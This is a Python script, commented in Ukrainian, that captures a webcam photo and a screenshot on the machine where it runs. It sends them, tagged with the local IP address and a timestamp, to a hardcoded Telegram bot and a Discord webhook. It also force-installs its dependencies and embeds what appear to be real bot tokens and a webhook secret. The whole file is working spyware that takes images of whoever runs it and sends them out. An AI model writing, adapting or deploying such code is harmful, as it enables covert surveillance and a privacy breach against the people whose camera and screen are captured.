import subprocess
import sys
from datetime import datetime
import os
import socket
from mss import mss
from telebot.types import InputMediaPhoto
import pycountry
import time
import requests
import shutil

# Функція для автоматичного встановлення бібліотек
def install_packages():
    required_packages = ['opencv-python', 'pyautogui', 'pyTelegramBotAPI', 'Pillow', 'mss', 'pycountry', 'requests']
    for package in required_packages:
        try:
            __import__(package)
        except ImportError:
            print(f"Встановлюємо {package}...")
            subprocess.check_call([sys.executable, "-m", "pip", "install", "--upgrade", "--force-reinstall", package])

# Встановлюємо бібліотеки перед імпортом
install_packages()

# Імпорт бібліотек після їх встановлення
import cv2
import pyautogui
import telebot

# Налаштування Telegram-бота
TELEGRAM_TOKEN = '8069626352:AAGxaNC_LS50uklNG9s8Lwy-CBYracGFJxE'
CHAT_ID = '5950905655'
bot = telebot.TeleBot(TELEGRAM_TOKEN)

# Налаштування Discord webhook
DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1381212631398092862/Z8ugozkkWoUsLZ5Ml4uftNjvnBzzikPywkRmYvkTpBgCse_QiMy__1LhXg-qMVHuWdjG'

# Визначення тимчасової директорії
TEMP_DIR = os.path.join(os.getenv('TEMP', 'C:\\Temp'))
os.makedirs(TEMP_DIR, exist_ok=True)

# Функція для отримання IP-адреси
def get_ip_address():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip_address = s.getsockname()[0]
        s.close()
        print(f"Отримана IP-адреса: {ip_address}")
        return ip_address
    except Exception as e:
        error_msg = f"Помилка отримання IP: {str(e)}"
        print(error_msg)
        return error_msg

# Функція для визначення країни та прапора
def get_country_info(ip):
    country_codes = {
        '192.168.0.': ('UA', '🇺🇦'),
        '172.16.': ('US', '🇺🇸'),
    }
    for ip_range, (code, flag) in country_codes.items():
        if ip.startswith(ip_range):
            country = pycountry.countries.get(alpha_2=code).name
            return country, flag
    return "Невідома країна", "🌐"

# Функція для знімку з веб-камери
def capture_webcam():
    print("Спроба відкрити веб-камеру...")
    cap = cv2.VideoCapture(0)
    if not cap.isOpened():
        print("Помилка: Не вдалося відкрити веб-камеру. Перевір доступ або підключення.")
        return None
    ret, frame = cap.read()
    if not ret:
        print("Помилка: Не вдалося зчитати кадр з веб-камери.")
        cap.release()
        return None
    timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
    filename = os.path.join(TEMP_DIR, f'webcam_{timestamp}.jpg')
    cv2.imwrite(filename, frame)
    cap.release()
    print(f"Зроблено знімок веб-камери: {filename}")
    return filename

# Функція для скріншота екрану
def capture_screenshot():
    print("Спроба зробити скріншот...")
    try:
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        filename = os.path.join(TEMP_DIR, f'screenshot_{timestamp}.jpg')
        screenshot = pyautogui.screenshot()
        screenshot.save(filename)
        print(f"Зроблено скріншот через PyAutoGUI: {filename}")
        return filename
    except Exception as e:
        print(f"Помилка з PyAutoGUI: {str(e)}")
        try:
            sct = mss()
            filename = os.path.join(TEMP_DIR, f'screenshot_{timestamp}.jpg')
            screenshot = sct.shot(output=filename)
            print(f"Зроблено скріншот через MSS: {filename}")
            return filename
        except Exception as e_mss:
            print(f"Помилка з MSS: {str(e_mss)}")
            return None

# Функція для відправки файлів у Telegram
def send_to_telegram(webcam_file, screenshot_file):
    ip_address = get_ip_address()
    country, flag = get_country_info(ip_address)
    caption = f"Знімок веб-камери та скріншот | IP: {ip_address} | Країна: {country} {flag} | Час: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"

    media = []
    photo_objects = []
    if webcam_file and os.path.exists(webcam_file):
        photo = open(webcam_file, 'rb')
        media.append(InputMediaPhoto(media=photo, caption=caption if not media else None))
        photo_objects.append(photo)
    if screenshot_file and os.path.exists(screenshot_file):
        photo = open(screenshot_file, 'rb')
        media.append(InputMediaPhoto(media=photo))
        photo_objects.append(photo)

    if media:
        try:
            bot.send_media_group(CHAT_ID, media=media)
            print("Успішно відправлено знімок веб-камери та скріншот до Telegram")
        except Exception as e:
            error_msg = f"Помилка відправки: {str(e)}"
            print(error_msg)
            bot.send_message(CHAT_ID, f"Помилка відправки. IP: {ip_address}. Деталі: {str(e)}")
        finally:
            time.sleep(1)
            for photo in photo_objects:
                photo.close()
    else:
        error_msg = "Не вдалося знайти знімок веб-камери або скріншот"
        print(error_msg)
        bot.send_message(CHAT_ID, f"{error_msg}. IP: {ip_address}")

# Функція для відправки файлів у Discord
def send_to_discord(webcam_file, screenshot_file):
    ip_address = get_ip_address()
    country, flag = get_country_info(ip_address)
    caption = f"Знімок веб-камери та скріншот | IP: {ip_address} | Країна: {country} {flag} | Час: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"

    files = []
    temp_files = []
    if webcam_file and os.path.exists(webcam_file):
        temp_webcam = os.path.join(TEMP_DIR, f'temp_webcam_{os.path.basename(webcam_file)}')
        shutil.copy(webcam_file, temp_webcam)
        files.append(('file1', open(temp_webcam, 'rb')))
        temp_files.append(temp_webcam)
        print(f"Додано тимчасовий файл веб-камери: {temp_webcam}, розмір: {os.path.getsize(temp_webcam)} байт")
    if screenshot_file and os.path.exists(screenshot_file):
        temp_screenshot = os.path.join(TEMP_DIR, f'temp_screenshot_{os.path.basename(screenshot_file)}')
        if not shutil.copy(screenshot_file, temp_screenshot):
            print(f"Помилка копіювання скріншота: {temp_screenshot}")
        else:
            files.append(('file2', open(temp_screenshot, 'rb')))
            temp_files.append(temp_screenshot)
            print(f"Додано тимчасовий файл скріншота: {temp_screenshot}, розмір: {os.path.getsize(temp_screenshot)} байт")

    if files:
        try:
            payload = {'content': caption}
            response = requests.post(DISCORD_WEBHOOK_URL, files=files, data=payload)
            if response.status_code in (200, 204):
                print("Успішно відправлено знімок веб-камери та скріншот до Discord")
            else:
                print(f"Помилка відправки до Discord: {response.status_code} {response.text}")
        except Exception as e:
            print(f"Помилка відправки до Discord: {str(e)}")
        finally:
            for _, file_obj in files:
                file_obj.close()
            for temp_file in temp_files:
                if os.path.exists(temp_file):
                    os.remove(temp_file)
    else:
        print("Не вдалося знайти знімок веб-камери або скріншот для відправки до Discord")

# Основна програма
def main():
    print("Початок виконання програми")
    # Знімок із веб-камери
    webcam_file = capture_webcam()
    # Скріншот екрану
    screenshot_file = capture_screenshot()
    # Відправка обох файлів разом
    send_to_telegram(webcam_file, screenshot_file)
    send_to_discord(webcam_file, screenshot_file)
    # Видалення оригінальних файлів після всіх відправок
    for f in [webcam_file, screenshot_file]:
        if f and os.path.exists(f):
            os.remove(f)
    print("Програма завершена. Натисни Enter для закриття...")
    input()

if __name__ == "__main__":
    main()